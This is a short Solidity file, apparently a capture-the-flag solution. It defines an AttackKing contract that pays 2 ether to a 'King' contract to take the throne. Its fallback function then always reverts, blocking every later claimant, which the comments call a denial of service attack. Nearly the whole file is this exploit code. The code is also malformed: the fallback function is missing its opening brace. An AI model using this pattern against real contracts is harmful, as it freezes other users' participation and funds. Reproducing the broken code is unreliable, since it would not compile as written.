//The goal here is the become the king, and stop every other person from taking the throne
//This is called a DENIAL OF SERVICE ATTACK
pragma solidity ^0.6.0;

contract AttackKing {
   // msg.sender with msg.value >> last king becomes king
 //where _king is Contract King instance
    constructor(address payable _king) public payable {
        (bool success, ) = _king.call{value: 2 ether}("");
    }
 //fallback or receive external payable; 
    fallback() external payable 
 //revert(), to ensure no one can call  king.transfer(msg.value);
        revert();
    }
}


